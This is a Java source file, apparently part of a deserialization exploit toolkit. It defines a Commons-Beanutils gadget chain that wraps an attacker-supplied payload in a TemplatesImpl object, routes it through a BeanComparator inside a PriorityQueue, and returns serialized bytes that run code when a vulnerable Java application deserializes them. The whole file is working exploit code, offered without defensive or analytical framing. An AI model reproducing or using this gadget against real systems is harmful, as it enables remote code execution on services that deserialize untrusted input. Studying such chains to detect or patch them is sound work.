package sonomon.deser.gadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import sonomon.deser.Deserialize;
import sonomon.deser.MyURLClassLoader;

import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsBeanutils2 {
	public static byte[] getjavaSerializedData(String payload, String jarname) throws Exception {
		
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
		
		
        MyURLClassLoader classLoader = new MyURLClassLoader(jarname);
        Class clazz = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
        Comparator comparator = (Comparator) clazz.getDeclaredConstructor(String.class,java.util.Comparator.class).newInstance(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");
        Deserialize.setFieldValue(comparator, "property", "outputProperties");
        Deserialize.setFieldValue(queue, "queue", new Object[]{tempImpl, tempImpl});
        
        return Deserialize.objectToBytes(queue);
    }
}